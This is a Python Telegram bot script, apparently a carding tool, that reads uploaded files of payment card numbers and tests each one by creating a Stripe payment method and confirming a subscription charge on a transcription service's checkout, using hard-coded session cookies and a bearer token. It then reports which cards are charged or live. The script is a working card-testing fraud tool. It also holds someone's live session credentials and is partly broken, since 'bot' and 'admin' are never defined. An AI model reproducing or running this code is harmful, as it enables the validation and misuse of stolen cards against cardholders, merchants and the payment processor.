import requests
import telebot
from telebot import types
from datetime import datetime, timedelta
import time
import json
from datetime import datetime, timedelta
import datetime
import time
import random
now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = hour + ':'+ mi +':' + ss + ' '+'0'+mm + '-' + dd + '-' + yyyy 
hours = now.hour
ran= ['45','56','34','12','66','67','90','89','44','65','32','97','58']
pr =random.choice(ran)


@bot.message_handler(commands=["start"])
def start(message):
	id = message.from_user.id
	if not id == admin:
		bot.reply_to(message,'البوت خاص بالمالك فقط\n @H_D_il / @H_D_il')
	else:
			bot.reply_to(message,"Send the file now \n ارسل الملف الان")


def StripeChargebot(ccx):
	import requests
	import time
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
#import requests
	time.sleep(3)
#import requests

	headers = {
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://js.stripe.com/',
    'sec-ch-ua-mobile': '?1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
}

	data = f'type=card&billing_details[name]=yusuf&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=ec00e8d1-c512-4053-9a01-45f02b22c6ebd05330&muid=070b51ab-af54-48a9-9bb3-c839cf612ad9cc2d12&sid=e5761279-6e4b-4a94-b9d0-6a2912f6be1b9e3827&payment_user_agent=stripe.js%2F7c4530bc8b%3B+stripe-js-v3%2F7c4530bc8b%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=34223&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZpWIzvedNJimC2YmM8_PHpVj87TDHfiH02_eX3K9jRXaXJxrvwEb8Y7VpbrJgW2Uw3JptNsHwRtULWdnkSqoRIFNivY4LsCnvYk1hsu7cKNDnJeo-mw07tkf0Ypx9pvBUz3xsjeKGP-CuXddiYGXT-bXj0kFr2Hs2fBRVaNxYqIT7CEUTLZRwueaZxlnbeEHGFCoedQyBCmOjMWOafo7onF1xSfEFyBQ2PCpRBfWQoIctfufn9AHodQ7-t2dg_xRGmPT1-BO8jVYFRDPBu7uRXG_Oeo7WZdXDZWHJQ54Vt55o1fao8V1E9BMHZxnfS70Yya9ANWNE4WlrZxHTP41C3OHPQSvMPxHN-6Lr5-9fhqxH6UQICAes_etb5Zl_E_UykxYut38NfKxKD7g5TsSGmBbOyU-jerng3x0T9NoiDOY5vUja0zeLQ0xAuz6BJWm_G_IxxCuKvFjFEfFwjyGbcXW9i-L0ACHGgyJiCfxXWRoBtip30C8SoxFIUYqlZx4WtcW9L-pK5JWeSS_vAUne-IvX7tyOyola8PkwqTUW_wIh2D9-8lADvQKs8KH1_OcHv39uH37IN8Ts0S4Je59tAuMypYeVGzBIN3v0EGolQ8HD0VwZfHRZ645EdhhvUXB1_aJogVbEOLsk8aENk8WpuI_vi7dRHWUGkvQFwoj7cpAecUoxefMdvg_zKVMrMaTUZuYzWgQa6j96YXt-zE5xxGq4sT73NwxagxVgnCA4yOTw2RraNCoAqCA8XIUpaXVBasOSHvhtUR9v1M9ue8Jxs9QGxMxY3mBfLAqY2XqZZbFoPGB5Qa18RkzgblYmQloGM_eMHvN-9uhAVWn959EKc-RirNyhwnS3lTVbfQFc7CFUB1RZqWdWu25XXujsZ5-0G-RO0fu06MV4Q3W8sm5KzmnZubeuBhC1VtODqSxpgg0JW7amEzn_WnfCP73AkrORBkzKmD-JQdFJyNuFAmyrUbrQ3KR1cLFTU9k4UcWnMuqXiwLD8LWsjWXDGM-o377wntT2917rEYW78_P9PXBF1AlkMzNka8Bwaz7SS_1iaejWGllLBqpPZNB_8Pv3LGNffMHitNHF7MlGuhmLRi0U7bhKiJpEMI_3EunTiJSgM0R037L4H5L0HJWtKdUNz78fNh5eVSF5xhDN6K401ZROE3IoZL-0YCPhtEFD567_TWUlEo7dwI6MxrH8Og1npa-5iA03EM42vPSUvLZGWZ6AhVV6n9LOlTETR40ResvEOIBDQeENUFQMYqr2-V5_NYjAClNK9MvLGVNE_cg9QbNCcHxkSEoL919SdUQ8EqB0Ow8SNpeHOc6fIcFrKbw0E_duLBrlnTkQFHIr9LfWHmUf7MRb7O7ZpxX1whMzNNmheBiFgeU0Wk0RJwdcH9qdrnkH-xe1zWHDTZFRHZu9rsAnmU0GZvc3RKZCBgTQKD57X9BeFXQ0vfGN7K0cKTnCXD6RbJolbNy74CCGwQiYwSxFpNLLLMD4FvsNxrzIQkDS_Tje9KCnRo-mbHWSuGowCbxPp0zLPgIAys0_lgob_qY_m8TfLVskY7Rws-TguaK3lyyTTxci7lR6QjaBkqujDgSED7eGiVSLbdj5K5VxnABnNhMDyeh6KnnDU1dQKK_BjHh6uNipam8Cvd4UaBl7vt-enozGGri6o8_sMsWJzTSmqIh9D2rhj5uU_yDXVujGfLjsEVxb0Pl8ckSwlMProPj3qUQlPZxtHa7qJKZLukl6n2F_hL6SZrl2_RqLDCGdNca0ihRNbTCwJ3h0WZ0wrx11S9ivTyXCqAr4N2GwGapFNZl-0YFiAoPlzThcmg9--KQGimYsXYlPT0EBlmQgjpPaCDVZEttOXzHORebYZenwFBliFQ74N1Ywe7XfKaPpdYgQt_iz1JhG60T0f_bl4CPPVnfAmqCyJyb6PtZ_l1Q4GH0zHhJZOcW4ZCox6OQaSEEbTUDzX9Ym8fF4qS3gbmcK8hURrxDd35DbkEnIaCiJ6Wp7Z4myYhUBuQRhmptEGyDbeG7esmKDOMm1t8lUibYVdBXKOfVsCALfTfdTKMvSTkrO1vZsY8OVz6H0aJVtd5EQ1F2vwh1FmK4Shh99PVe8NYuuD875zQWZQ5G_SVAPsZbrDHmmhnyHD-_B7de4yKiKxGnlcFQNmHhNyW5wqqZFmxByXs63V8kW7o2V4cM5mNsJAqHNoYXJkX2lkzhQ8hB-ia3KoMWYzNDEzYzWicGQA.Ve3_iKk831BYCZnTHmuJClr2wfupKYsq57OLjjs5Txs'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	ide=response.json()['id']
	cookies = {
    'ahoy_visitor': 'e7aa3692-fcef-4b5c-bdc1-118385962d3e',
    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-03-29T14%3A18%3A19.878Z%22%2C%22consentId%22%3A%22d532bf02-4c6e-43ea-a713-281ff8cefb2d%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-03-29T14%3A18%3A19.878Z%22%7D',
    '_gcl_au': '1.1.2047172663.1711721900',
    'intercom-device-id-frdatdus': 'd0960679-47b7-4b72-8558-353e8792f03d',
    '__stripe_mid': '070b51ab-af54-48a9-9bb3-c839cf612ad9cc2d12',
    'ahoy_visit': '5e609a1a-08fb-45a3-aa76-91b9f126fe22',
    '_gid': 'GA1.2.1899386481.1714864548',
    'user_id': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ik1URXlPVFkyTkRVPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLnVzZXJfaWQifX0%3D--c0f35f4984cb9c69778ff59c8d49aa0aead70dd4',
    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hORGcyTkRVMk1DNHdNVEE1TXpJMElsMD0iLCJleHAiOiIyMDI0LTA1LTExVDIzOjE2OjAwLjAxMFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--7719f9165b131038c2db8f926d1b67cf90fa8e5b',
    'unsecure_is_signed_in': '1',
    '_ga': 'GA1.2.845821790.1711721899',
    '_cioid': '11296645',
    'intercom-session-frdatdus': 'aXdKVytsTkpOcEVoRHI2bnFrOFhlSVRVbHN5anFEYm5idDE0bW91NS9jd1pHMkxNdjg0K3dCMU5BbTRKSncrei0tSTdPWU5qQzRaRGt0Mldja1lzWnpZZz09--f8c3a809092b5a3290253b064e44017108db1baa',
    '_ga_4T8KCV9Y2D': 'GS1.1.1714864545.2.1.1714864572.33.0.0',
    '__stripe_sid': 'e5761279-6e4b-4a94-b9d0-6a2912f6be1b9e3827',
    '_transcribe_session': 'O%2FeJKZIzG9HJTjvdtaNWNS5aIhzXToj8gTtbPq2%2BiqI0C2OA50ih8oJ2X261kLK%2FMcja%2BIF0PJcHwW7dFF7bgZ1yVSQnzOcslCM66NTzviaXSALZpHID0FvteJVW8wqc3Qszi%2FbefsI%2B404UpXk2tiyztAaZfNAXVKGcWuk%2FmfDdU0mkirnqkxMI4aBFd%2FQmPligRqAF8avxXVQWqDfT0oVbvSXQv88HvsNEqTGf%2BZm4xsCaxz0bfngiUrq4rA%2BR420PqYWYODFBSBJZXn5sXe8cCKhm26IrMrFiQ%2F%2FstpQ1FX%2Fd4QxGH6rViqGqWsNeg6voGAbdRcYJIo7cPKikgkcLs4XfcwnnsCQF%2FBqsvTSqw3nMlG4ncvqSoDGmJkjRsZi98oFcIocxhiGeBO6YWVwPOPSzgqPPNrd%2FNlFneCy4X%2F9yRnSs4Uo6q1otpkb2WVGkmdJJUg%3D%3D--87peVQltekm6RulA--lVcZdFjbz6WhpLEsqqs03w%3D%3D',
}

	headers = {
    'authority': 'www.happyscribe.com',
    'accept': 'application/json',
    'accept-language': 'en,ar;q=0.9,en-US;q=0.8',
    'authorization': 'Bearer OQRJtXO8dyPUQ3DMs8deCgtt',
    'content-type': 'application/json',
    # 'cookie': 'ahoy_visitor=e7aa3692-fcef-4b5c-bdc1-118385962d3e; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-03-29T14%3A18%3A19.878Z%22%2C%22consentId%22%3A%22d532bf02-4c6e-43ea-a713-281ff8cefb2d%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-03-29T14%3A18%3A19.878Z%22%7D; _gcl_au=1.1.2047172663.1711721900; intercom-device-id-frdatdus=d0960679-47b7-4b72-8558-353e8792f03d; __stripe_mid=070b51ab-af54-48a9-9bb3-c839cf612ad9cc2d12; ahoy_visit=5e609a1a-08fb-45a3-aa76-91b9f126fe22; _gid=GA1.2.1899386481.1714864548; user_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ik1URXlPVFkyTkRVPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLnVzZXJfaWQifX0%3D--c0f35f4984cb9c69778ff59c8d49aa0aead70dd4; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hORGcyTkRVMk1DNHdNVEE1TXpJMElsMD0iLCJleHAiOiIyMDI0LTA1LTExVDIzOjE2OjAwLjAxMFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--7719f9165b131038c2db8f926d1b67cf90fa8e5b; unsecure_is_signed_in=1; _ga=GA1.2.845821790.1711721899; _cioid=11296645; intercom-session-frdatdus=aXdKVytsTkpOcEVoRHI2bnFrOFhlSVRVbHN5anFEYm5idDE0bW91NS9jd1pHMkxNdjg0K3dCMU5BbTRKSncrei0tSTdPWU5qQzRaRGt0Mldja1lzWnpZZz09--f8c3a809092b5a3290253b064e44017108db1baa; _ga_4T8KCV9Y2D=GS1.1.1714864545.2.1.1714864572.33.0.0; __stripe_sid=e5761279-6e4b-4a94-b9d0-6a2912f6be1b9e3827; _transcribe_session=O%2FeJKZIzG9HJTjvdtaNWNS5aIhzXToj8gTtbPq2%2BiqI0C2OA50ih8oJ2X261kLK%2FMcja%2BIF0PJcHwW7dFF7bgZ1yVSQnzOcslCM66NTzviaXSALZpHID0FvteJVW8wqc3Qszi%2FbefsI%2B404UpXk2tiyztAaZfNAXVKGcWuk%2FmfDdU0mkirnqkxMI4aBFd%2FQmPligRqAF8avxXVQWqDfT0oVbvSXQv88HvsNEqTGf%2BZm4xsCaxz0bfngiUrq4rA%2BR420PqYWYODFBSBJZXn5sXe8cCKhm26IrMrFiQ%2F%2FstpQ1FX%2Fd4QxGH6rViqGqWsNeg6voGAbdRcYJIo7cPKikgkcLs4XfcwnnsCQF%2FBqsvTSqw3nMlG4ncvqSoDGmJkjRsZi98oFcIocxhiGeBO6YWVwPOPSzgqPPNrd%2FNlFneCy4X%2F9yRnSs4Uo6q1otpkb2WVGkmdJJUg%3D%3D--87peVQltekm6RulA--lVcZdFjbz6WhpLEsqqs03w%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'referer': 'https://www.happyscribe.com/v2/10807386/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'id': 10486458,
    'address': '9350 N Central Expy',
    'name': 'yusuf',
    'country': 'US',
    'vat': None,
    'billing_account_id': 10486458,
    'orderReference': 'nzpgbuo',
    'user_id': 11296645,
    'organization_id': 10807386,
    'hours': 0,
    'balance_increase_in_cents': None,
    'payment_method_id': ide,
    'transcription_id': None,
    'plan': 'basic_2023_05_01',
    'order_id': None,
    'recurrence_interval': 'month',
    'extra_plan_hours': None,
}

	req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
	print(req.json()['error'])
	if 'Retry later' in req.text:
		ms = 'risk'
		return ms
		time.sleep(15)
	try:
		msg = req.json()['error']
		print(ccx,'¦',msg)
		if "Your card has insufficient funds." in req.json()['error']:
			ms = 'Your card has insufficient funds.'
			return ms
		else:
			ms = req.json()['error']
			return ms
	except:
		if 'requires_action' in req.json():
			ms = '3D Required'
			return ms
		else:
			return req.json()
@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,'''- Welcome Dear ♡!
You are Subscribed KilwaChk BOT ♕!
Send Me The Combo Visa File To Check it

Gate - Stripr Charge 15$ ViP ♕ .
Programmer - @Lx0b2''')
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	rs = 0
	rsk = 0
	cek = 0
	nop = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message,"Please Wait Status Processing...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
				try:
					url = ('https://lookup.binlist.net/'+cc[:6])
					data = requests.get(url).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					cn=(data['country']['name'])
				except:
					cn=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					typ=(data['type'])
				except:
					typ=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					url=(data['bank']['url'])
				except:
					url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					bran = (data['brand'])
				except:
					bran = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				#	start_time = time.time()

				
				start_time = time.time()
				try:
					last = str(StripeChargebot(cc))
				except Exception as e:
					print(e)
					last=e
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"-> {last}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"-> {cc}", callback_data='u8')
				cm3 = types.InlineKeyboardButton(f"- Charged ✅ -> {ch} ", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"- Approved ✅ -> {live} ", callback_data='x')
				cm7 = types.InlineKeyboardButton(f"- Cvv ✅ -> {rs} ", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"- Declined ❌ -> {dd} ", callback_data='x')
				cm8 = types.InlineKeyboardButton(f"- Risk Wait ❌ -> {rsk} ", callback_data='x')
				cm10 = types.InlineKeyboardButton(f"- Incorrect CC ❌ -> {nop} ", callback_data='x')
				cm6 = types.InlineKeyboardButton(f"- All -> {total}/{cek}", callback_data='x')
				mes.add(cm1, cm2, cm3, cm4, cm7,cm5,cm8,cm10,cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Please Wait Checking Your Cards !.
Programeer - @H_D_il 🧸 ''', reply_markup=mes)
				end_time = time.time()
				execution_time = end_time - start_time
				msg = f'''
<strong>- Hello Boss New Approved Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @H_D_il</strong>'''
				msgcvc = f'''
<strong>- Hello Boss New Cvv Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @H_D_il</strong>'''
				if 'Your card was declined.' in last:
					dd += 1
					cek+=1
					time.sleep(15)
				elif 'Your card number is incorrect.' in last:
					nop += 1
					cek+=1
					time.sleep(15)
				elif 'error' in last:
					nop += 1
					cek+=1
					time.sleep(15)
				elif "3D Required" in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(15)
				elif "Your card's security code is incorrect." in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(15)
				elif 'risk' in last:
					rsk+=1
					cek+=1
					time.sleep(15)
				elif 'Your card has insufficient funds.' in last:
					live+=1
					cek+=1
					bot.reply_to(message, msg)
					time.sleep(15)
				else:
					ch += 1
					cek+=1
					msg1 = f'''
<strong>- Hello Boss New Approved Charge Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @H_D_il</strong>'''
					bot.reply_to(message, msg1)
					time.sleep(15)
	except Exception as eo:
		print(eo)
print("تم تشغيل البوت")
bot.polling()
